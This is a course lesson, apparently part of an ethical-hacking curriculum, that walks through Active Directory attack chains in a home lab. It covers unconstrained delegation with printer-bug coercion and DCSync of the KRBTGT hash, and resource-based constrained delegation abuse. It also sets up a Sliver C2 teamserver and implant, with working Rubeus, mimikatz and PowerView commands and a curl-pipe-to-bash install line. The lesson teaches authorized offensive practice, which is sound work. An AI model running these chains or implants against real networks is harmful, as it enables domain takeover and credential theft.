@@ -1,0 +1,187 @@
+---
+trackId: cybersecurity-ethical-hacking
+tier: 4
+title: "Path A — Red Team: Advanced Offensive Operations"
+order: 2
+estimatedHours: 35
+slug: red-team-advanced-offensive-operations
+---
+
+## Where This Path Sits
+
+You've picked Red Team as your Tier 4 specialization. That means two things: you go deep enough here to think architecturally about offensive operations — not just "run tool, get shell," but *why* a technique works against the Windows security model, and what an operation actually looks like end to end — and you still need to understand Blue Team (Path B) and AppSec (Path C) well enough to work alongside those specialists without them having to translate for you.
+
+Every technique in this module runs against one of exactly three things: your own AD home lab (`lab.local`) and Metasploitable2 from Tier 3, Offensive Security's Proving Grounds Practice machines, or — strictly within defined scope and safe harbor — a real bug bounty program's named in-scope assets. Nothing here targets a live system you don't have explicit authorization to touch. That's not a disclaimer bolted onto the lesson; it's the actual rule your OSCP exam, your PG Practice terms of service, and every bug bounty safe-harbor clause enforce. Violate it in the real world and you've committed a crime, full stop, regardless of intent.
+
+## From PTES to PEN-200
+
+Tier 3 gave you PTES's seven phases: pre-engagement, intelligence gathering, threat modeling, vulnerability analysis, exploitation, post-exploitation, reporting. PTES tells you *what* phases a professional engagement has. Offensive Security's PEN-200 (the OSCP course material, which is free to read even if you don't buy the exam voucher) tells you *how* to actually move through those phases on a real Windows/AD network, with a specific operational loop:
+
+1. **Enumerate exhaustively before you touch anything.** PEN-200 calls this "enumeration is 80% of the work." Port scan, service version fingerprinting, SMB null-session checks, SNMP walks, web directory brute-forcing — all before a single exploit attempt.
+2. **Build a target map, not a target list.** Every host, every service, every credential you find gets recorded with its source. This is the skill that separates OSCP candidates who pass from those who don't: they can tell you *why* they believe a box is vulnerable, not just that a scanner flagged it.
+3. **Try the low-hanging fruit first.** Default creds, known CVEs with public PoCs, misconfigurations — before custom exploit development.
+4. **Pivot and re-enumerate.** Every new host or credential reopens step 1 from a new vantage point. PEN-200's AD module is built entirely around this loop: compromise one box, dump its secrets, use them to see further into the domain, repeat.
+5. **Document as you go, not at the end.** PEN-200 explicitly grades you on reproducible proof (screenshots with timestamps, command history) because a finding nobody can reproduce isn't a finding — it's a guess.
+
+This loop is what you'll run against every PG Practice box this tier. PG Practice machines are retired, intentionally vulnerable VMs Offensive Security hosts specifically for this kind of practice — using them is the legal, sanctioned version of "random vulnerable box on the internet."
+
+## Advanced AD Attack Chains: Unconstrained Delegation
+
+Tier 3 covered Kerberoasting and pass-the-hash as single techniques. A real AD compromise chains several primitives together. Here's a complete chain against your own `lab.local` domain, using a classic primitive: **unconstrained delegation**.
+
+A computer object with unconstrained delegation enabled can impersonate *any* user who authenticates to it, domain-wide — the box caches a copy of that user's TGT. If you get code execution on an unconstrained-delegation host and can force a high-value account (ideally the Domain Controller's machine account) to authenticate to it, you steal that account's TGT.
+
+**Step 1 — find the unconstrained delegation host.** From a session on any domain-joined box in your lab (PowerView loaded):
+
+```powershell
+Get-DomainComputer -Unconstrained | Select-Object name, dnshostname
+```
+
+Say this returns `WEB01` — a box you've already compromised via a web app vuln from Tier 3's DVWA-style practice, now rebuilt as a domain member in your lab.
+
+**Step 2 — start monitoring for tickets on WEB01**, using Rubeus:
+
+```
+Rubeus.exe monitor /interval:5 /nowrap
+```
+
+**Step 3 — coerce the Domain Controller to authenticate to WEB01.** The classic lever is the MS-RPRN "printer bug" — any domain user can ask a server running the Print Spooler service to send a print-job notification to an arbitrary host, which forces that server to authenticate via Kerberos to whatever you specify. Your DC runs Spooler by default. From an attacker-controlled box with network line of sight to both:
+
+```
+SpoolSample.exe DC01.lab.local WEB01.lab.local
+```
+
+This tells `DC01` to send a spooler notification to `WEB01`. To do that, `DC01$` (the domain controller's own machine account) authenticates to `WEB01` — and because `WEB01` has unconstrained delegation, Rubeus running there catches a full TGT for `DC01$`.
+
+**Step 4 — Rubeus's monitor output** looks like this:
+
+```
+[*] Ticket cache size: 10
+[+] Found new TGT:
+
+  User                  :  DC01$@LAB.LOCAL
+  StartTime              :  10/2/2026 9:14:02 AM
+  EndTime                :  10/2/2026 7:14:02 PM
+  RenewTill              :  10/9/2026 9:14:02 AM
+  Flags                  :  name_canonicalize, pre_authent, renewable, forwarded, forwardable
+  Base64EncodedTicket    :
+
+      doIFvDCCBbigAwIBBaEDAgEWooIEujCCBLZhggSyMIIErqADAgEFoRAbDkxBQi5MT0NBTA...
+```
+
+**Step 5 — pass that ticket and DCSync.** A domain controller's machine account can replicate the entire domain database. With the DC's TGT loaded:
+
+```
+Rubeus.exe ptt /ticket:doIFvDCCBbigAwIBBaEDAgEWooIEujCCBLZhggSyMIIErqADAgEFoRAbDkxBQi5MT0NBTA...
+
+mimikatz # lsadump::dcsync /domain:lab.local /user:lab\krbtgt
+```
+
+That dumps the KRBTGT hash — full "keys to the kingdom," because you can now forge Golden Tickets for the entire domain. The chain, named: **web app foothold → unconstrained delegation enumeration → printer bug coercion → TGT capture → DCSync → full domain compromise.** Every single step above only ever runs against `lab.local`, the AD environment you built and own in Tier 3.
+
+## ACL Abuse: Resource-Based Constrained Delegation
+
+The second chain abuses Active Directory's permission model directly, with no delegation misconfiguration required — just one over-permissioned ACL, which BloodHound ingestion (Tier 3) is built to surface.
+
+Say BloodHound shows a low-privilege user you control, `svc_backup`, has `GenericWrite` over a computer object `FILE01$` in `lab.local`. `GenericWrite` on a computer object lets you write to its `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute — the attribute that controls **resource-based constrained delegation (RBCD)**: which principals `FILE01` will accept S4U impersonation requests from.
+
+**Step 1 — confirm the ACL** with PowerView:
+
+```powershell
+Get-DomainObjectAcl -Identity "FILE01$" -ResolveGUIDs | Where-Object {
+  $_.ActiveDirectoryRights -match "GenericWrite|GenericAll|WriteDacl"
+}
+```
+
+**Step 2 — write RBCD, pointing it at a computer account you control** (or create one — any authenticated user can add up to 10 computer accounts to the domain by default, `ms-DS-MachineAccountQuota`):
+
+```powershell
+$ComputerSid = (Get-DomainComputer "ATTACKPC" -Properties objectsid).objectsid
+$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
+$SDBytes = New-Object byte[] ($SD.BinaryLength)
+$SD.GetBinaryForm($SDBytes, 0)
+Get-DomainComputer "FILE01" | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity' = $SDBytes}
+```
+
+**Step 3 — abuse it with an S4U request.** Because `ATTACKPC$` is now trusted to delegate to `FILE01`, Rubeus can request a service ticket *as any domain user* — including an administrator — for a service on `FILE01`:
+
+```
+Rubeus.exe s4u /user:ATTACKPC$ /rc4:<ATTACKPC$ NTLM hash> /impersonateuser:Administrator /msdsspn:cifs/FILE01.lab.local /ptt
+```
+
+That lands a forged service ticket impersonating `Administrator` on `FILE01`'s CIFS service — enough for `psexec`-style command execution as a local admin on that box, without ever cracking a password. Named: **GenericWrite ACL → attacker-controlled computer account → RBCD attribute write → S4U2Self/S4U2Proxy impersonation → admin access.** This is Elad Shamir's "wagging the dog" primitive, one of the most commonly abused real-world AD misconfigurations, and you're running it exclusively against your own lab domain.
+
+## Command and Control: What a C2 Framework Actually Is
+
+A C2 (command-and-control) framework is not a magic "hacking tool" — it's three specific architectural pieces, and understanding them is what lets a defender (Path B, this tier) recognize them on the wire and in process telemetry:
+
+1. **Implant (agent/beacon).** Code running on the compromised host that executes tasks and reports results. It has to persist, communicate, and evade basic process/memory inspection — which is exactly the surface Blue Team's EDR detections target.
+2. **Listener (C2 server/teamserver).** The operator-controlled infrastructure the implant calls home to. It queues tasks and receives results.
+3. **Tasking protocol.** The format and transport for "do this" / "here's the result" — HTTP(S), DNS, mTLS, SMB named pipes for peer-to-peer movement. This is what a network defender's IDS/proxy logging is built to fingerprint: beacon intervals, jitter, header anomalies, JA3/JA3S TLS fingerprints.
+
+Sliver (BishopFox, open source) and Mythic (its2600/@its_a_feature, open source, plugin-based) are the two frameworks you'll see most in real red team engagements today, having largely displaced cracked Cobalt Strike in both criminal and legitimate-red-team use — which is exactly why Blue Team needs people who've seen them from the inside.
+
+**Setup — entirely inside your isolated, host-only lab network.** Your C2 teamserver and target VMs sit on a VirtualBox/VMware host-only or internal network with no route to your home LAN or the internet, matching the AD lab network you built in Tier 3.
+
+```bash
+# On your lab's dedicated "C2 server" VM (Debian, host-only NIC only)
+curl https://sliver.sh/install | sudo bash
+sudo sliver-server
+```
+
+Inside the Sliver console:
+
+```
+sliver > new-operator --name redteam-op --lhost 127.0.0.1
+[*] Generated new client config file: redteam-op_127.0.0.1.cfg
+
+sliver > mtls --lhost 192.168.56.10 --lport 8888
+[*] Starting mTLS listener ...
+
+sliver > generate --mtls 192.168.56.10:8888 --os windows --arch amd64 --save /opt/sliver/implant.exe
+[*] Generating new windows/amd64 implant binary
+[*] Build completed
+[*] Implant saved to /opt/sliver/implant.exe
+```
+
+`192.168.56.10` is your lab's internal-only teamserver address — it is never bound to an interface with internet or home-network reachability. You deliver `implant.exe` to your own `lab.local` Windows VM the same way you'd deliver any payload in a lab exercise — manually copying it over, exactly like Tier 3's Metasploit work — and catch the callback:
+
+```
+sliver > sessions
+
+ ID       Name    Transport    Remote Address       Hostname         OS
+ ======== ======= ============ ==================== ================ =======
+ a1b2c3d4 QUIET_FOX  mtls      192.168.56.22:49771  WEB01.lab.local  windows
+```
+
+From here, Sliver's tasking commands (`shell`, `ps`, `download`, `execute-assembly` for running Rubeus/BloodHound collectors in-memory) are what let you chain the AD attacks above through a single piece of lab infrastructure instead of RDP-ing between boxes by hand — which is the actual point of a C2 framework on a real engagement: centralized tasking across many compromised hosts at once.
+
+## Evasion Concepts — Taught Defensively
+
+This tier does **not** teach you to bypass a real production EDR. It teaches you what signature-based detection targets, because that's the exact inventory Path B's detection engineers (this tier's Blue Team path) have to build coverage for. Treat this section as a target list for Blue Team, not a toolkit for Red Team.
+
+Signature-based AV/EDR flags executables on a handful of concrete, enumerable things:
+
+- **Static byte signatures.** Known-bad byte sequences or cryptographic hashes of known malicious files — the oldest and weakest detection layer, defeated by any recompilation, which is why EDR vendors no longer rely on it alone.
+- **String indicators.** Literal strings in the binary — a Cobalt Strike or Sliver default C2 profile string, a known mutex name, a hardcoded user-agent — that identify the tool family even across rebuilds.
+- **API call sequences.** This is the layer that actually matters today. `VirtualAlloc` → `WriteProcessMemory` → `CreateRemoteThread` is the textbook process-injection sequence; EDR hooks these Win32/NT APIs and alerts on the *sequence*, not any single call, because any of those calls alone is used by thousands of legitimate programs.
+- **YARA rules on disk and in memory.** Pattern-matching rules that scan files and process memory for combinations of strings, byte offsets, and structural PE features characteristic of a known implant or packer.
+- **Behavioral/ETW telemetry.** Windows' Event Tracing for Windows feeds EDR with process creation trees, command-line arguments, and network connections — a `powershell.exe` child of `winword.exe` making an outbound mTLS connection on an unusual port is a behavioral signal regardless of what the binary looks like statically.
+
+Path B's lesson on detection engineering builds Sigma/YARA rules against exactly these five layers. Knowing this inventory is what makes you useful in a purple-team exercise: when Blue Team asks "what would a real implant look like to us," you can answer with the actual architecture, not folklore.
+
+## Proving Grounds Practice: Running the Full Loop
+
+Proving Grounds Practice machines are retired or custom-built boxes Offensive Security hosts specifically for OSCP-style practice, under their terms of service — this is the one "real," always-legal target outside your own lab. Pick a Windows AD-adjacent box and run the PEN-200 loop from the top of this lesson: full port scan, service enumeration, foothold, then check whether the box is domain-joined and whether any of the AD primitives above (unconstrained delegation, abusable ACLs, Kerberoasting from Tier 3) apply. Many PG Practice Windows boxes are deliberately built around exactly these misconfigurations because they mirror what OSCP's AD set covers.
+
+## Exercise
+
+In your own `lab.local` AD home lab, build and execute a two-stage chain:
+
+1. Configure one domain-joined member server with unconstrained delegation enabled (`Set-ADAccountControl -Identity WEB01$ -TrustedForDelegation $true`, run as Domain Admin while setting up the lab — this is you configuring the vulnerable state on purpose, not exploiting a stranger's box).
+2. From a low-privileged foothold, enumerate for the unconstrained delegation host, coerce DC authentication with the printer bug, capture the DC's TGT, and DCSync the KRBTGT hash.
+3. Separately, grant a low-privileged lab user `GenericWrite` over a second computer object, and execute the RBCD chain to land local admin on that box via S4U impersonation — without ever touching that account's password.
+
+**Hint:** if `SpoolSample` doesn't trigger a callback, check two things first — that the Print Spooler service is actually running on your lab DC (`Get-Service Spooler` on `DC01`), and that `WEB01`'s unconstrained delegation flag actually took (`Get-DomainComputer WEB01 -Unconstrained` should return it). Most failures at this stage are lab misconfiguration, not a flaw in the technique.
+
+Write up both chains as if they were PG Practice findings: target, precondition, exact command sequence, and impact — that report format is what you'll produce for real in Tier 4's bug bounty work.
